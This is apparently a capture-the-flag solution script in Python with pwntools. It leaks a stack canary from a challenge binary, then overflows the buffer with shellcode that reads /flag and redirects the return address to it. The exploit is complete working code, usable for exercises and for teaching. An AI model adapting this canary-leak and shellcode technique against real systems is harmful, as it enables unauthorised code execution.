#!usr/bin/pyhton3
from pwn import *

# Set the machine architecture
context.arch = 'amd64'

# Retrieve the ELF information from the binary
elf = ELF("/challenge/toddlerone_level4.0")

# Initialize the win_check variable
win_check = 0x47ccabc9fc143978

# Compute the distance from the buffer to the canary on the stack
buffer_offset = 0x88
canary_offset = 0x10
canary_distance = buffer_offset - canary_offset

# Compute the distance from the buffer to the exit variable on the stack
exit_offset = 0x18
buffer_size = buffer_offset - exit_offset

# Run the program
io = elf.process()

# Send the size of the first payload to the program
io.recvuntil(b'Payload size: ')
io.sendline(f'{canary_distance + 1}'.encode())

# Build and send the size of the first payload to the program
# NOTE: the payload will overwrite the first byte of the canary in order
#       to make the program print it. Also, the payload will trigger the
#       secret method to call another time the 'challenge' method before
#       returning in order to avoid stack smashing.
PAYLOAD = b'A'*(canary_distance - 6) + b'REPEATB'
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Retrieve the canary by reading the output and selecting the correct bytes
io.readuntil(b'REPEATB')
canary = b'\x00' + io.recvline().strip()[:7]

# Retrieve the address of the buffer location where we will load the shellcode
io.recvuntil(b'The input buffer begins at 0x')
shellcode_addr = int(io.recvuntil(b',').decode()[:-1], 16)

# Send the payload size to the program
# NOTE: the size of the payload is computed as: 
#       distance_from_return_address + return_address_length
io.recvuntil(b'Payload size: ')
io.sendline(f'{buffer_offset + 8}'.encode())

# Build the shellcode to open the "/flag" file
shellcode = asm(shellcraft.cat("/flag"))

# Build and send the payload to the program
# NOTE: we load enough padding bytes to reach the win_check variable on the stack,
#       there we load the value in order to avoid the check
PAYLOAD = shellcode +\
        b'A'*(buffer_size - len(shellcode)) +\
        p64(win_check) +\
        canary +\
        b'B'*8 + p64(shellcode_addr)
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
# NOTE: errors='ignore' or errors='replace' is needed in order
#       to be able to print the program output
print(io.recvall().decode(errors='ignore'))